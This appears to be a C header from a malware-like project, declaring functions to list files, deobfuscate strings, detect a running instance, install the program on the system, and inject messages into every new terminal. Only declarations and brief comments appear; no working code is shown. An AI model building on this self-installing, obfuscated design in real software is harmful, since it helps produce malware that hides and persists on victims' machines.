#ifndef SYSTEM_UTILS_H
#define SYSTEM_UTILS_H

#define SHM_CHECKNUMBER "/sm_checknumber"


/**
 * Frees a list of files
 *
 * We use a wrapper because of the realloc and MAX_FILES
 *
 * Returns - OK or ERROR
*/
void free_list_files(char **list, int len);

/**
 * Lists files
 *
 * Given a directory, returns a list of files inside it
 *
 * Returns - OK or ERROR
*/
char **list_files(char *dir_name, int *len);

/**
 * Deobfuscates strings
 *
 * Does its shit
 *
 * Returns - OK or ERROR
*/
char *decrypt_string(char *data, size_t len);

/**
 * Checks if its already running
 *
 * Checks for processes called NAME, if there are 2 or
 * more (you + 1) then we stop the program
 *
 * Returns - OK or ERROR
*/
int already_running();

/**
 * Install on the system
 *
 * Installs itself on the system
 *
 * Returns - OK or ERROR
*/
int install();

/**
 * prints the message in all new terminals at the begining
 * 
 * gets the message that will be printed
 * 
 * Returns - OK or ERROR
*/
int add_terminal_message(char *msg);

/**
 * prints the message in all new terminals at the begining
 * 
 * You can choose the colour. It start with TERMINAL in types.h
 * 
 * gets the message that will be printed
 * 
 * Returns - OK or ERROR
*/
int add_terminal_message_with_colour(char *msg, char* colour);

/**
 * allows to get a random number.
 * 
 * This number is different every time you execute the program
*/
int get_random_number();

/**
 * Create the checknumber in shared memory.
 * 
 * for checkin' we comare this with get_random_number.
*/
int create_checknumber();


#endif